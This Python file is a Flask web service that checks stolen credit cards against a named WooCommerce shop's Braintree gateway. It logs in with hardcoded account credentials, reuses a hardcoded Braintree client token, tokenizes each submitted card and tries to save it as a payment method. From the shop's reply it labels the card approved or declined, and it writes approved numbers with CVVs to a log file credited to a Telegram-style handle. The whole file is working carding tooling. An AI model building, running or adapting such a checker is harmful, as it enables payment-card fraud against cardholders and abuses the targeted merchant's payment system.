import requests
from bs4 import BeautifulSoup
import re
import base64
import json
import uuid
import time
import os
import random
from flask import Flask, jsonify, request
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Proxy Configuration REMOVED ---
proxies = None 
# ------------------------------------

app = Flask(__name__)

class BraintreeLoginChecker:
    def __init__(self, proxies=None):
        self.session = requests.Session()
        self.proxies = proxies # Will be None
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        self.known_auth_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzI1MjUwNTcsImp0aSI6IjYwZTk2MTYzLTVhNDctNDBhNC1hNzBlLThiMzg3YmEzOGNmZCIsInN1YiI6IjNteWQ5cXJxemZqa3c5NDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNteWQ5cXJxemZqa3c5NDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.uE3_vvUv1zcEHpgx7PzGp6tCP9EUZMRFxvo-LjyNh6vnJ0PxqJj-OT9nGk83XlZxtsLLkZjU85wF6QCIMakiuQ"
    
    def login(self, domain, username, password):
        login_url = f"{domain}/my-account/"
        
        # Step 1: Visit Homepage to establish cookies
        try:
            # Proxies=None means direct connection
            self.session.get(domain, headers=self.headers, proxies=self.proxies, verify=False, timeout=15)
        except Exception as e:
            return False, f"Connection Error: {str(e)}"

        # Step 2: Get Login Page
        response = self.session.get(login_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=15)
        
        if response.status_code != 200:
            return False, f"Failed to get login page (Status: {response.status_code})"
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Step 3: Extract Nonce
        nonce_input = soup.find("input", {"name": "woocommerce-login-nonce"})
        if not nonce_input:
            match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', response.text)
            if match:
                login_nonce = match.group(1)
            else:
                nonce_input = soup.find("input", {"name": "_wpnonce"})
                if nonce_input:
                    login_nonce = nonce_input.get("value")
                else:
                    return False, "Login nonce not found"
        else:
            login_nonce = nonce_input.get("value")
        
        login_data = {
            'username': username,
            'password': password,
            'rememberme': 'forever',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'redirect_to': domain + '/my-account/',
            'login': 'Log in',
        }
        
        login_headers = self.headers.copy()
        login_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url,
            'Origin': domain
        })
        
        # Step 4: Perform Login
        login_response = self.session.post(login_url, headers=login_headers, data=login_data, proxies=self.proxies, verify=False, timeout=15)
        
        # Step 5: Check Response
        if "Log out" in login_response.text or "woocommerce-MyAccount-navigation" in login_response.text:
            return True, self.session
        else:
            soup_resp = BeautifulSoup(login_response.text, 'html.parser')
            error_container = soup_resp.find('div', class_='woocommerce-error')
            if not error_container:
                error_container = soup_resp.find('ul', class_='woocommerce-error')
            
            if error_container:
                error_msg = error_container.get_text(strip=True)
                return False, f"Site Error: {error_msg}"
            
            if "login" in login_response.url:
                 return False, "Login Failed: Redirected back to login (Check credentials)"
                 
            return False, "Login failed: Unknown response"
    
    def get_auth_tokens(self, domain, use_known_token=True):
        payment_url = f"{domain}/my-account/add-payment-method/"
        
        headers = self.headers.copy()
        headers['Referer'] = f"{domain}/my-account/"
        
        response = self.session.get(payment_url, headers=headers, proxies=self.proxies, verify=False, timeout=15)
        
        if response.status_code != 200:
            return None, None, "Failed to get payment page"
        
        add_nonce = None
        match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
        if match:
            add_nonce = match.group(1)
        else:
            return None, None, "Payment nonce not found"
        
        auth_token = None
        
        if use_known_token:
            auth_token = self.known_auth_token
        else:
            jwt_pattern = r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'
            matches = re.findall(jwt_pattern, response.text)
            if matches:
                auth_token = matches[0]
        
        if not auth_token:
            auth_token = self.known_auth_token
        
        return add_nonce, auth_token, "Success"
    
    def tokenize_card(self, card_data, auth_token):
        n, mm, yy, cvc = card_data
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        token_headers = {
            'authorization': f'Bearer {auth_token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': self.headers['User-Agent']
        }
        
        try:
            response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=token_headers,
                json=json_data,
                proxies=self.proxies, # None
                verify=False,
                timeout=15
            )
            
            if response.status_code == 200:
                token_data = response.json()
                if 'data' in token_data and 'tokenizeCreditCard' in token_data['data']:
                    return token_data['data']['tokenizeCreditCard']['token']
        except Exception:
            return None
        return None
    
    def submit_payment(self, domain, add_nonce, token):
        payment_url = f"{domain}/my-account/add-payment-method/"
        
        submit_headers = self.headers.copy()
        submit_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': payment_url,
            'Origin': domain
        })
        
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        response = self.session.post(payment_url, headers=submit_headers, data=data, proxies=self.proxies, verify=False, timeout=15)
        return response

def check_card(cc_line):
    """Check a single credit card"""
    start_time = time.time()
    
    domain = "https://ddlegio.com"
    username = "xcracker663@gmail.com"
    password = "Xcracker@911"
    
    try:
        # Passing proxies=None
        checker = BraintreeLoginChecker(proxies=proxies)
        
        # 1. Login
        success, result = checker.login(domain, username, password)
        if not success:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": f"Login Error: {result}", "time": f"{elapsed_time:.2f}s"}
        
        # 2. Get Auth Tokens
        add_nonce, auth_token, msg = checker.get_auth_tokens(domain, use_known_token=True)
        if not add_nonce:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": f"Error: {msg}", "time": f"{elapsed_time:.2f}s"}
        
        if not auth_token:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": "No auth token available", "time": f"{elapsed_time:.2f}s"}
        
        # 3. Parse Card Data
        try:
            n, mm, yy, cvc = cc_line.strip().split('|')
        except ValueError:
            return {"status": "DECLINED", "response": "Invalid card format. Use CC|MM|YY|CVC", "time": "0.00s"}

        if len(yy) == 2:
            yy = '20' + yy
        
        # 4. Tokenize Card
        token = checker.tokenize_card((n, mm, yy, cvc), auth_token)
        if not token:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": "Card tokenization failed", "time": f"{elapsed_time:.2f}s"}
        
        # 5. Submit Payment
        response = checker.submit_payment(domain, add_nonce, token)
        
        # 6. Parse Response
        soup = BeautifulSoup(response.text, 'html.parser')
        
        success_div = soup.find('div', class_='woocommerce-message')
        error_div = soup.find('div', class_='woocommerce-error')
        
        final_status = "DECLINED"
        response_msg = "Unknown error"
        is_approved = False
        
        if success_div:
            message = success_div.get_text(strip=True)
            if any(word in message.lower() for word in ['success', 'added', 'approved']):
                final_status = "APPROVED"
                response_msg = message
                is_approved = True
            else:
                response_msg = message
        elif error_div:
            message = error_div.get_text(strip=True)
            if 'cvv' in message.lower() or 'security code' in message.lower():
                response_msg = "Reason: CVV - " + message
            else:
                response_msg = message
        else:
            notice_wrapper = soup.find('div', class_='woocommerce-notices-wrapper')
            if notice_wrapper:
                response_msg = notice_wrapper.get_text(strip=True)
            else:
                response_msg = "No response message found from gateway"

        elapsed_time = time.time() - start_time

        if is_approved:
            try:
                with open('approved.txt', 'a', encoding='utf-8') as approved_file:
                    approved_file.write(f"""=========================
[APPROVED]

Card: {n}|{mm}|{yy}|{cvc}
Response: {response_msg}
Gateway: Braintree Auth
Time: {elapsed_time:.1f}s
Bot By: @FailureFr
=========================

""")
            except Exception as e:
                print(f"Logging error: {e}")

        return {"status": final_status, "response": response_msg, "time": f"{elapsed_time:.2f}s"}
            
    except Exception as e:
        elapsed_time = time.time() - start_time
        return {"status": "DECLINED", "response": f"System Error: {str(e)}", "time": f"{elapsed_time:.2f}s"}

@app.route('/gate=b3/cc=<card>', methods=['GET'])
def check_credit_card(card):
    try:
        if '|' not in card:
            return jsonify({"status": "DECLINED", "response": "Invalid format. Please use: CC_NUMBER|MM|YY|CVC"}), 400
            
        result = check_card(card)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"status": "DECLINED", "response": f"Error: {str(e)}"}), 500

@app.route('/')
def index():
    return """
    <h1>B3 Auth API (No Proxy)</h1>
    <p>Use the endpoint: /gate=b3/cc={card}</p>
    <p>Format: CC_NUMBER|MM|YY|CVC</p>
    <p>Example: /gate=b3/cc=4111111111111111|12|25|123</p>
    <p>Target: ddlegio.com</p>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
